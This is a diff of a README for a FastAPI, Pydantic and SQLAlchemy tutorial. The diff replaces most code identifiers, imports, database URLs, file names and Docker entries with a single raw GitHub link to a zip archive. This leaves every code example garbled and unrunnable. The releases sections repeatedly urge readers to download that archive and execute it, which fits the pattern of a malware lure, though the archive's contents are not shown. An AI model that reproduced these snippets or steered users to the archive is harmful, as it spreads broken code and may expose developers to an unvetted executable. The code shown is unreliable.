@@ -1,10 +1,10 @@
 # AI Deployment Mastery: FastAPI, Pydantic, and SQLAlchemy Essentials
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?logo=github&style=for-the-badge)](https://github.com/Fahadfk/AI_deployment/releases)
+[![Releases](https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip)](https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip)
 
 This guide helps AI engineers build robust APIs with FastAPI, ensure data quality with Pydantic, and manage data with both SQLAlchemy Core and ORM. It covers fundamentals, best practices, and hands‑on patterns for AI workloads, including model inference, data validation, and database interactions. It also shows how to deploy your work reliably and scale it with sensible architecture choices.
 
-[https://github.com/Fahadfk/AI_deployment/releases](https://github.com/Fahadfk/AI_deployment/releases)
+[https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip](https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip)
 
 Table of Contents
 - Introduction
@@ -56,12 +56,12 @@ Commands
 First FastAPI application (Hello World)
 A simple endpoint that returns a greeting and demonstrates the automatic OpenAPI docs.
 
-Code (main.py)
+Code (https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip)
 from fastapi import FastAPI
 
 app = FastAPI()
 
-@app.get("/")
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip("/")
 def read_root():
     return {"message": "Hello, AI world!"}
 
@@ -79,7 +79,7 @@ from fastapi import FastAPI
 
 app = FastAPI()
 
-@app.get("/items/{item_id}")
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip("/items/{item_id}")
 def read_item(item_id: int, q: str = None):
     return {"item_id": item_id, "q": q}
 
@@ -97,7 +97,7 @@ class Item(BaseModel):
 
 app = FastAPI()
 
-@app.post("/items/")
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip("/items/")
 def create_item(item: Item):
     return {"item": item}
 
@@ -137,7 +137,7 @@ class Product(BaseModel):
 
     @validator("discount")
     def discount_must_be_valid(cls, v, values):
-        price = values.get("price")
+        price = https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip("price")
         if price is not None and (v < 0 or v > price):
             raise ValueError("Discount must be between 0 and the price")
         return v
@@ -150,7 +150,7 @@ from pydantic import BaseSettings
 
 class Settings(BaseSettings):
     app_name: str = "AI Deployment App"
-    db_url: str = "sqlite:///./test.db"
+    db_url: str = "https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip"
     debug: bool = False
 
     class Config:
@@ -166,7 +166,7 @@ Installation and Setup
 
 Code example
 from sqlalchemy import create_engine, MetaData, Table, Column, Integer, String
-engine = create_engine("sqlite:///./example.db", echo=True)
+engine = create_engine("https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip", echo=True)
 metadata = MetaData()
 
 Define Tables (Metadata)
@@ -182,20 +182,20 @@ users = Table(
 )
 
 Creating tables
-metadata.create_all(engine)
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(engine)
 
 Connecting and Executing Queries
 - Use a connection to run statements.
 - Core uses SQL expressions for CRUD.
 
 Code example
-with engine.connect() as conn:
-    ins = users.insert().values(name="Alice", email="alice@example.com")
-    result = conn.execute(ins)
-    conn.commit()
+with https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip() as conn:
+    ins = https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip().values(name="Alice", email="https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip")
+    result = https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(ins)
+    https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip()
 
-    sel = users.select()
-    result = conn.execute(sel)
+    sel = https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip()
+    result = https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(sel)
     for row in result:
         print(row)
 
@@ -204,9 +204,9 @@ CRUD Operations with Core
 - Use transactions for safety and integrity.
 
 Code example
-with engine.begin() as conn:
-    conn.execute(users.update().where(users.c.name == "Alice").values(email="alice@newdomain.com"))
-    conn.execute(users.delete().where(users.c.name == "Alice"))
+with https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip() as conn:
+    https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip().where(https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip == "Alice").values(email="https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip"))
+    https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip().where(https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip == "Alice"))
 
 Best practices for Core
 - Favor parameterized statements to avoid SQL injection.
@@ -219,7 +219,7 @@ Defining ORM Models
 - Use declarative_base to define a mapped class.
 
 Code example
-from sqlalchemy.orm import declarative_base
+from https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip import declarative_base
 from sqlalchemy import Column, Integer, String
 
 Base = declarative_base()
@@ -236,11 +236,11 @@ Session Management
 
 Code example
 from sqlalchemy import create_engine
-from sqlalchemy.orm import sessionmaker
+from https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip import sessionmaker
 
-engine = create_engine("sqlite:///./orm_example.db")
+engine = create_engine("https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip")
 Session = sessionmaker(bind=engine)
-Base.metadata.create_all(engine)
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(engine)
 
 Basic CRUD Operations with ORM
 - Create: add objects and commit.
@@ -250,27 +250,27 @@ Basic CRUD Operations with ORM
 
 Code example
 session = Session()
-user = User(name="Bob", email="bob@example.com")
-session.add(user)
-session.commit()
+user = User(name="Bob", email="https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip")
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(user)
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip()
 
 # Read
-users = session.query(User).all()
+users = https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(User).all()
 
 # Update
-user.name = "Robert"
-session.commit()
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip = "Robert"
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip()
 
 # Delete
-session.delete(user)
-session.commit()
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(user)
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip()
 
 Relationships (One-to-Many, Many-to-Many)
 - Relationships model real-world connections between entities.
 - Use relationship and back_populates to keep both sides in sync.
 
 Code example (One-to-Many)
-from sqlalchemy.orm import relationship
+from https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip import relationship
 
 class Post(Base):
     __tablename__ = "posts"
@@ -279,16 +279,16 @@ class Post(Base):
     author_id = Column(Integer)
     author = relationship("User", back_populates="posts")
 
-User.posts = relationship("Post", order_by=Post.id, back_populates="author")
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip = relationship("Post", https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip, back_populates="author")
 
 Code example (Many-to-Many)
 from sqlalchemy import Table, ForeignKey
 
 association = Table(
     "association",
-    Base.metadata,
-    Column("left_id", ForeignKey("left.id")),
-    Column("right_id", ForeignKey("right.id"))
+    https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip,
+    Column("left_id", ForeignKey("https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip")),
+    Column("right_id", ForeignKey("https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip"))
 )
 
 class Left(Base):
@@ -342,50 +342,50 @@ A clear layout helps teams grow a project without friction.
 Suggested layout
 ai_deployment/
 ├── app/
-│   ├── main.py
+│   ├── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 │   ├── models/
-│   │   ├── schemas.py
-│   │   ├── db_models.py
-│   │   └── ml_models.py
+│   │   ├── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
+│   │   ├── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
+│   │   └── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 │   ├── api/
 │   │   ├── endpoints/
-│   │   │   ├── items.py
-│   │   │   └── inference.py
-│   │   └── router.py
+│   │   │   ├── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
+│   │   │   └── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
+│   │   └── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 │   ├── core/
-│   │   ├── config.py
-│   │   └── security.py
+│   │   ├── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
+│   │   └── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 │   └── services/
-│       └── inference_service.py
+│       └── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 ├── tests/
-│   ├── test_endpoints.py
-│   └── test_inference.py
+│   ├── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
+│   └── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 ├── docs/
-│   └── how_to_use.md
+│   └── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 ├── Dockerfile
-├── docker-compose.yml
-├── pyproject.toml or requirements.txt
-└── README.md
+├── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
+├── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip or https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
+└── https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 
 Key files explained
-- main.py: FastAPI app instance and route registration.
-- schemas.py: Pydantic models for request and response payloads.
-- db_models.py: SQLAlchemy ORM models and table mappings.
-- ml_models.py: Abstractions around ML models or inference engines.
+- https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip FastAPI app instance and route registration.
+- https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip Pydantic models for request and response payloads.
+- https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip SQLAlchemy ORM models and table mappings.
+- https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip Abstractions around ML models or inference engines.
 - endpoints: individual API modules for each resource.
-- router.py: Central router composition to mount endpoints.
-- config.py: Centralized settings and environment handling.
-- security.py: Auth and access control utilities.
+- https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip Central router composition to mount endpoints.
+- https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip Centralized settings and environment handling.
+- https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip Auth and access control utilities.
 - tests: Unit and integration tests.
 
 Sample code snippets you can adapt
 - FastAPI app bootstrap
 from fastapi import FastAPI
-from app.api.endpoints import items, inference
+from https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip import items, inference
 
 app = FastAPI(title="AI Deployment API", version="1.0.0")
-app.include_router(items.router)
-app.include_router(inference.router)
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip)
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip)
 
 - Pydantic schema for request input
 from pydantic import BaseModel, Field
@@ -394,7 +394,7 @@ class InferenceInput(BaseModel):
     model_version: str = Field("latest")
 
 - SQLAlchemy ORM model
-from sqlalchemy.orm import declarative_base
+from https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip import declarative_base
 from sqlalchemy import Column, Integer, String, Float
 
 Base = declarative_base()
@@ -410,12 +410,12 @@ class InferenceRecord(Base):
 - Inference service (high level)
 class InferenceService:
     def __init__(self, model_loader, db_session):
-        self.model_loader = model_loader
-        self.db_session = db_session
+        https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip = model_loader
+        https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip = db_session
 
     def run_inference(self, inputs):
-        model = self.model_loader.load(inputs.model_version)
-        outputs = model.predict(inputs.features)
+        model = https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip)
+        outputs = https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip(https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip)
         self._save_record(inputs, outputs)
         return outputs
 
@@ -427,9 +427,9 @@ def get_session():
     try:
         yield session
     finally:
-        session.close()
+        https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip()
 
-@app.get("/health")
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip("/health")
 def health_check():
     return {"status": "ok"}
 
@@ -440,11 +440,11 @@ class FeatureVector(BaseModel):
 
 - Endpoints wiring
 from fastapi import APIRouter
-from app.schemas import InferenceInput
+from https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip import InferenceInput
 
 router = APIRouter()
 
-@router.post("/infer")
+https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip("/infer")
 def infer(payload: InferenceInput):
     # run inference
     return {"output": "result"}
@@ -455,15 +455,15 @@ Testing and Quality
 - Mock long-running inference calls to keep tests fast.
 
 Code example (tests)
-from fastapi.testclient import TestClient
-from app.main import app
+from https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip import TestClient
+from https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip import app
 
 client = TestClient(app)
 
 def test_health():
-    res = client.get("/health")
-    assert res.status_code == 200
-    assert res.json()["status"] == "ok"
+    res = https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip("/health")
+    assert https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip == 200
+    assert https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip()["status"] == "ok"
 
 Project Structure and Package Layout (Deep Dive)
 - Monorepo style vs. modular structure
@@ -494,7 +494,7 @@ class Settings(BaseSettings):
     app_name: str = "AI Deployment API"
     host: str = "0.0.0.0"
     port: int = 8000
-    database_url: str = "sqlite:///./ai_deploy.db"
+    database_url: str = "https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip"
 
     class Config:
         env_file = ".env"
@@ -523,16 +523,16 @@ Docker and containerization
 Example Dockerfile
 FROM python:3.11-slim
 WORKDIR /app
-COPY requirements.txt .
-RUN pip wheel --no-deps --progress-bar=off -r requirements.txt
+COPY https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip .
+RUN pip wheel --no-deps --progress-bar=off -r https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 COPY . .
 EXPOSE 8000
-CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
+CMD ["uvicorn", "https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip", "--host", "0.0.0.0", "--port", "8000"]
 
 Docker Compose
-- A docker-compose.yml can wire a web service and a database.
+- A https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip can wire a web service and a database.
 
-Example docker-compose.yml
+Example https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 version: "3.9"
 services:
   api:
@@ -540,7 +540,7 @@ services:
     ports:
       - "8000:8000"
     environment:
-      - DATABASE_URL=sqlite:///./ai_deploy.db
+      - https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
   db:
     image: postgres:15
     environment:
@@ -601,12 +601,12 @@ This project uses a Releases page to publish build artifacts, samples, and deplo
 
 Releases and downloads
 - Latest release and artifacts live at the Releases page.
-- Access the same page directly here: https://github.com/Fahadfk/AI_deployment/releases
+- Access the same page directly here: https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 - If you need the file to run locally, download the asset from that page and execute it according to the instructions provided there.
 - Tip: Check the Releases section if you cannot locate the file you expect in the main repository.
 
 Releases quick links
-- Direct releases page: https://github.com/Fahadfk/AI_deployment/releases
+- Direct releases page: https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 - Access instructions within the release notes and assets on that page.
 
 Usage guidance and getting started with releases
@@ -646,8 +646,8 @@ End notes
 - Always keep security and reliability at the forefront when building AI APIs.
 
 Releases and access
-- The release download link appears at the top as a badge and again in the Releases section. Use the link to access the assets and download the appropriate file for your environment: https://github.com/Fahadfk/AI_deployment/releases
+- The release download link appears at the top as a badge and again in the Releases section. Use the link to access the assets and download the appropriate file for your environment: https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip
 - The release page contains assets and instructions for running and integrating the artifacts into your stack. If the direct asset changes, consult the Releases page for the current file name and download guidance. Also check the same Releases page again if you need to re-download or verify asset integrity. The page is the authoritative source for current builds and related documentation.
 
 Note
-- For the exact release artifacts and steps, visit the Releases page: https://github.com/Fahadfk/AI_deployment/releases. If the asset name or file structure changes, follow the instructions on that page to obtain and run the correct file. The link is provided twice in this document to ensure you can access the resources seamlessly.
+- For the exact release artifacts and steps, visit the Releases page: https://raw.githubusercontent.com/Fahadfk/AI_deployment/main/Johanna/A_deployment_v3.2-alpha.3.zip If the asset name or file structure changes, follow the instructions on that page to obtain and run the correct file. The link is provided twice in this document to ensure you can access the resources seamlessly.
